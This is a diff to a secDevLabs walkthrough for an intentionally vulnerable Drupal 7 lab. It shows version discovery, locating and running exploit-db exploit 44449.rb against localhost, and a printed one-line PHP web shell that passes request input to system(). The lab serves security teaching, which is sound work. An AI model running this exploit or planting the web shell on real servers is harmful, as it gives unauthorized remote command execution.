@@ -8,7 +8,7 @@ If you don't know [secDevLabs] or this [intended vulnerable web application][2] 
 
 It's possible to reach the server's web application from the standard HTTP port 80, as shown by the image below:
 
-<img src="attack1.gif" align="center"/>
+<img src="attack1.png" align="center"/>
 
 Afterwards, by having a look at the `/robots.txt` file, it's possible to find the `CHANGELOG.txt` file in the `Disallow` field, as depicted by the image below:
 
@@ -34,17 +34,29 @@ Then simply search for the version of the CMS found:
 searchsploit drupal 7.
 ```
 
+If you are using OSX, this command would help you make a copy of the exploit to your /tmp folder:
+
+```
+cp /usr/local/opt/exploitdb/share/exploit-database/exploits/php/webapps/44449.rb /tmp
+```
+
 ## 🔥
 
 Running the malicious Ruby code, we have evidence that a remote code execution is possible on the web server, using the following commands as shown below:
 
 ```sh
-ruby 44449.rb http://localhost
+ruby /tmp/44449.rb http://localhost
 ```
 
 <img src="attack5.png" align="center"/>
 
-Following on the last step, a shell is created by the malicious code on which we can execute commands, just like `whoami`, as shown by the image:
+The exploit works by adding into the server a malicious `s.php` wich allows remote code execution on it via following malicious content: 
+
+```php
+<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
+```
+
+Using the exploit's "fake shell", we can type a command just like `whoami` to verify that we indeed have a RCE on the server, as shown by the image:
 
 <img src="attack6.png" align="center"/>
 
